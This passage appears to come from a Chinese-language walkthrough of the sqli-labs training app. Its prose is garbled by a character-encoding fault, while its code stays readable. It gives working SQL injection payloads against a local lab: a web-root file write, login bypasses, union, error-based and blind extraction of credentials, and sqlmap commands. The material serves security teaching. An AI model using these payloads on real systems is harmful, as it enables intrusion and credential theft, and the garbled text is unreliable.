class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå†æ‰§è¡Œä¸Šé¢çš„è¯­å¥åº”è¯¥æ˜¯å¯ä»¥æˆåŠŸçš„</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> http://127.0.0.1:8888/Less-7/users.txt<span class="token number">1</span>    Dumb    Dumb<span class="token number">2</span>    Angelina    I-kill-you<span class="token number">3</span>    Dummy    p@ssword<span class="token number">4</span>    secure    crappy<span class="token number">5</span>    stupid    stupidity<span class="token number">6</span>    superman    genious<span class="token number">7</span>    batman    mob<span class="token operator">!</span>le<span class="token number">8</span>    admin    admin<span class="token number">9</span>    admin1    admin1<span class="token number">10</span>    admin2    admin2<span class="token number">11</span>    admin3    admin3<span class="token number">12</span>    dhakkan    dumbo<span class="token number">14</span>    admin4    admin4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€èˆ¬æƒ…å†µçœ‹ä¸‹å¯ä»¥å¾€ Web ç›®å½•å†™æ–‡ä»¶çš„æ—¶å€™ï¼Œç›´æ¥å†™ shell æ•ˆç‡ä¼šæ›´é«˜ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/Less-7/info.php"</span><span class="token comment">--+ </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¿é—®å¯¹åº”çš„ URL çœ‹çœ‹æ˜¯å¦è§£æäº†å‘¢ï¼š</p><p><img src="https://image.3001.net/images/20200513/15893696834265.png" alt="img"></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-7 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™é‡Œ å°±ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>å’Œ Less-7 æ³¨å…¥æ–¹å¼ä¸€è‡´ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œè¿™é‡Œ å°±ä¸å†å•°å—¦äº†ã€‚</p><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># ä½¿ç”¨å•å¼•å·æ‹¼æ¥</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒå»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»æºç ä¸­å¯ä»¥çœ‹åˆ° if else éƒ½è¾“å‡ºçš„æ˜¯ You are inâ€¦â€¦â€¦.. è¿™æ ·å°±ä¸èƒ½é€šè¿‡å¸ƒå°”ç›²æ³¨æ¥è¿›è¡Œæ³¨å…¥äº†ï¼Œåªèƒ½ç”¨æœ€æ…¢çš„å»¶æ—¶æ³¨å…¥ã€‚å»¶æ—¶æ³¨å…¥ç»†èŠ‚å¯ä»¥å‚è€ƒ Less-1 çš„æ³¨å…¥ç»†èŠ‚ã€‚</p><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">GET</td><td align="left">å»¶æ—¶ç›²æ³¨</td><td align="left"><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># å…ˆä½¿ç”¨åŒå¼•å·å†ç›´æ¥æ‹¼æ¥</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token comment"># æ”¯æŒå»¶æ—¶ç›²æ³¨</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token keyword">else</span><span class="token punctuation">:</span>    è¾“å‡º You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œ Less-9 åˆ©ç”¨æ–¹å¼ä¸€æ ·ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œå…·ä½“å¯ä»¥å‚è€ƒ Less-9</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&#39;x&#39;</code></td></tr></tbody></table><p><strong>æºç ç®€å•åˆ†æ</strong>ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST æ–¹å¼æ¥å—å˜é‡</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># ä½¿ç”¨å•å¼•å·æ‹¼æ¥ SQL</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username='<span class="token interpolation"><span class="token variable">$uname</span></span>' and password='<span class="token interpolation"><span class="token variable">$passwd</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    è¾“å‡ºæŸ¥è¯¢çš„ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œ Less-1 çš„åˆ©ç”¨æ–¹å¼ç›¸åŒï¼Œåªæ˜¯ç”± GET å‹å˜æˆ POST å‹ã€‚</p><h3 id="ä¸‡èƒ½å¯†ç "><a href="#ä¸‡èƒ½å¯†ç " class="headerlink" title="ä¸‡èƒ½å¯†ç "></a>ä¸‡èƒ½å¯†ç </h3><p>è¿™é‡Œæ‹¿ admin ç”¨æˆ·æ¥æ¨¡æ‹Ÿç™»å½•æµ‹è¯•ï¼Œé¦–å…ˆæŸ¥è¯¢å‡º admin çš„ç”¨æˆ·ä¿¡æ¯å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mysql<span class="token operator">></span> <span class="token keyword">select</span> * from <span class="token function">users</span> where username <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span>+----+----------+----------+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>+----+----------+----------+<span class="token operator">|</span>  <span class="token number">8</span> <span class="token operator">|</span> admin    <span class="token operator">|</span> admin    <span class="token operator">|</span>+----+----------+----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ ¸å¿ƒçš„ SQL è¯­å¥åªä½¿ç”¨å•å¼•å·æ‹¼æ¥ï¼Œè¿™é‡Œå°±æ˜¯ä¸€ä¸ªç»å…¸çš„ä¸‡èƒ½å¯†ç æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹ Payload æ¥ç™»å½•ç³»ç»Ÿï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># æ³¨é‡Šæ‰ passwd æ¥ç™»å½•</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token string">'--+&amp;passwd=&amp;submit=Submituname=admin'</span><span class="token comment">#&amp;passwd=&amp;submit=Submit</span><span class="token comment"># æ³¨é‡Šåé¢è¯­å¥ å¹¶ æ·»åŠ ä¸€ä¸ªæ°¸çœŸæ¡ä»¶</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1--+&amp;submit=Submituname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span>--+<span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">' or 1#&amp;submit=Submituname=admin&amp;passwd=1'</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#&amp;submit=Submit</span><span class="token comment"># é—­åˆåé¢è¯­å¥ å¹¶ æ·»åŠ ä¸€ä¸ªæ°¸çœŸæ¡ä»¶</span><span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'or'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span class="token assign-left variable">uname</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span><span class="token number">1</span><span class="token string">'||'</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token assign-left variable">submit</span><span class="token operator">=</span>Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºè¿™æ˜¯ä¸€ä¸ª POST å‹çš„æ³¨å…¥ï¼Œé‚£ä¹ˆ è¿™é‡Œå°±å†å•°å—¦ä¸€éï¼Œèµ°ä¸€éè¯¦ç»†çš„æµç¨‹å§</p><h3 id="è”åˆæŸ¥è¯¢æ³¨å…¥-1"><a href="#è”åˆæŸ¥è¯¢æ³¨å…¥-1" class="headerlink" title="è”åˆæŸ¥è¯¢æ³¨å…¥"></a>è”åˆæŸ¥è¯¢æ³¨å…¥</h3><blockquote><p>POST æ•°æ®é‡Œé¢ä¸èƒ½æœ‰ <code>+</code>ï¼Œè¿™é‡Œå¾—æ‰‹åŠ¨è½¬æ¢ä¸ºç©ºæ ¼</p></blockquote><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&amp;passwd&#x3D;1&#39;union select 1,(SELECT GROUP_CONCAT(username,password) FROM users)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥1-1"><a href="#æŠ¥é”™æ³¨å…¥1-1" class="headerlink" title="æŠ¥é”™æ³¨å…¥1"></a>æŠ¥é”™æ³¨å…¥1</h3><p>æ‰‹åŠ¨ä¿®æ”¹ <code>LIMIT+0,1</code> æ¥è¿›è¡Œç»“æœåç§»</p><pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39;AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æŠ¥é”™æ³¨å…¥2-1"><a href="#æŠ¥é”™æ³¨å…¥2-1" class="headerlink" title="æŠ¥é”™æ³¨å…¥2"></a>æŠ¥é”™æ³¨å…¥2</h3><p>æ‰‹åŠ¨ä¿®æ”¹ <code>LIMIT+0,1</code> æ¥è¿›è¡Œç»“æœåç§»</p><pre class="line-numbers language-paylaod" data-language="paylaod"><code class="language-paylaod">uname&#x3D;admin&amp;passwd&#x3D;1&#39; AND (SELECT 1 FROM(SELECT count(*),CONCAT((SELECT (SELECT (SELECT CONCAT(0x7e,0x27,cast(username AS CHAR),0x27,0x7e) FROM users LIMIT 0,1)) FROM INFORMATION_SCHEMA.TABLES LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) AND 1&#x3D;1#&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¸ƒå°”ç›²æ³¨-1"><a href="#å¸ƒå°”ç›²æ³¨-1" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯ä¸º <code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and left(database(),1)&gt;&#39;r&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submituname&#x3D;admin&#39; and left(database(),1)&gt;&#39;s&#39;#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å»¶æ—¶ç›²æ³¨-1"><a href="#å»¶æ—¶ç›²æ³¨-1" class="headerlink" title="å»¶æ—¶ç›²æ³¨"></a>å»¶æ—¶ç›²æ³¨</h3><p>æ•°æ®åº“ç¬¬ä¸€ä¸ªå­—æ¯çš„ ascii ç ä¸º 115ï¼Œå³<code>s</code></p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submituname&#x3D;admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))#&amp;passwd&#x3D;&amp;submit&#x3D;Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h3><p><strong>åŠ è½½ç›®æ ‡</strong></p><p>å¯ä»¥ç›´æ¥å°† Burpsuite æˆªå–çš„æ•°æ®åŒ…å†…å®¹ä¿æŒä¸ºæ–‡æœ¬æ ¼å¼ <code>test.txt</code>ï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/Less-11/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:8888</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://127.0.0.1:8888/Less-11/</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">38</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>uname=admin&amp;passwd=2333&amp;submit=Submit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åç›´æ¥ä½¿ç”¨ sqlmap çš„ -r å‚æ•°æ¥åŠ è½½è¿™ä¸ªè¯·æ±‚åŒ…ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¹Ÿå¯ä»¥æ‰‹åŠ¨é€šè¿‡ <code>--data</code> æ¥å¯¹ POST çš„æ•°æ®åŒ…å†…å®¹è¿›è¡Œæ³¨å…¥æ£€æµ‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®é™…ä¸Š <code>--data</code> æ¯”è¾ƒé¸¡è‚‹ï¼Œæ“ä½œæ•ˆç‡æ¯”è¾ƒä½ï¼Œå› ä¸ºæ¯”è¾ƒå†·é—¨ï¼Œæ‰€æœ‰é€‚åˆæ¥ç‚«è€€è‡ªå·±ä¼šè¿™ä¸ªå‚æ•°ï¼Œè¿™æ ·å¯¹ sqlmap ä¸å¤Ÿäº†è§£çš„äºº å°±ä¼šè§‰å¾—å¾ˆé«˜å¤§ä¸Šã€‚æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘éƒ½ä½¿ç”¨ <code>--data</code> è¿™ä¸ªå‚æ•°æ¥è¿›è¡Œæ³¨å…¥ ğŸ¤“</p><p><strong>è”åˆæŸ¥è¯¢æ³¨å…¥</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>U -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>æŠ¥é”™æ³¨å…¥</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å¸ƒå°”ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>B -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>å»¶æ—¶ç›²æ³¨</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://127.0.0.1:8888/Less-11/"</span> --data<span class="token operator">=</span><span class="token string">"uname=admin&amp;passwd=2333&amp;submit=Submit"</span> -p <span class="token string">"uname"</span> --dbms<span class="token operator">=</span>MySQL --random-agent --flush-session --technique<span class="token operator">=</span>T -v <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">è”åˆã€æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>å’Œ Less-11 çš„åˆ©ç”¨æ–¹å¼ä¸€æ ·ï¼Œåªæ˜¯ SQL æ‹¼æ¥æ–¹å¼ä¸åŒï¼Œè¿™é‡Œå°±ä¸å†å•°å—¦äº†ã€‚</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=(&#39;x&#39;)</code></td></tr></tbody></table><p>**ç®€å•æºç åˆ†æ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># POST æ–¹å¼æ¥å—å˜é‡</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment"># ä½¿ç”¨å•å¼•å·å’Œæ‹¬å·æ¥æ‹¼æ¥ SQL</span>@<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=('<span class="token interpolation"><span class="token variable">$uname</span></span>') and password=('<span class="token interpolation"><span class="token variable">$passwd</span></span>') LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>    å¹¶æ²¡æœ‰è¾“å‡ºå•¥ä¿¡æ¯<span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºæ²¡æœ‰è¾“å‡ºæŸ¥è¯¢åçš„ä¿¡æ¯çš„åŸå› ï¼Œæ‰€ä»¥ç›¸å¯¹äº Less-11 å’Œ Less-12 æ¥è¯´å°±å°‘äº† è”åˆæŸ¥è¯¢çš„æ³¨å…¥æ–¹å¼ï¼Œå…¶ä»–è¿˜æ˜¯æ¢æ±¤ä¸æ¢è¯ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&quot;x&quot;</code></td></tr></tbody></table><p>**ç®€å•æºç åˆ†æ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># å…ˆä½¿ç”¨ åŒå¼•å· å†ç›´æ¥å¸¦å…¥ SQL è¯­å¥</span><span class="token variable">$uname</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$uname</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span><span class="token string single-quoted-string">'"'</span><span class="token operator">.</span><span class="token variable">$passwd</span><span class="token operator">.</span><span class="token string single-quoted-string">'"'</span><span class="token punctuation">;</span> @<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT username, password FROM users WHERE username=<span class="token interpolation"><span class="token variable">$uname</span></span> and password=<span class="token interpolation"><span class="token variable">$passwd</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å’Œ Less-13 å¼‚æ›²åŒå·¥ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·ï¼Œæˆ‘ä»¬æ¢å¯¹åº”çš„é—­åˆæ–¹å¼å³å¯è¿›è¡Œæ³¨å…¥ã€‚</p><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=&#39;x&#39;</code></td></tr></tbody></table><p>æºç ä¸­æ³¨é‡Šæ‰äº† MySQL çš„æŠ¥é”™æ—¥å¿—ï¼Œæ‰€ä»¥è¿™é‡Œå°±ä¸å¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥äº†ï¼Œåªèƒ½ä½¿ç”¨å¸ƒå°”ç›²æ³¨æˆ–è€…å»¶æ—¶ç›²æ³¨ã€‚</p><p> è¿™é‡Œä¸å†åšé‡å¤æ— æ„ä¹‰çš„è®°å½•äº†ã€‚</p><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td align="left"><code>username=(&quot;x&quot;)</code></td></tr></tbody></table><p>å’Œ Less-15 æ³¨å…¥ç±»å‹ä¸€è‡´ï¼Œæ›´æ¢å¯¹åº”çš„é—­åˆæ–¹å¼å³å¯ã€‚</p><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><table><thead><tr><th align="left">è¯·æ±‚æ–¹å¼</th><th align="left">æ³¨å…¥ç±»å‹</th><th align="left">æ‹¼æ¥æ–¹å¼</th></tr></thead><tbody><tr><td align="left">POST</td><td align="left">æŠ¥é”™ã€å¸ƒå°”ç›²æ³¨ã€å»¶æ—¶ç›²æ³¨</td><td 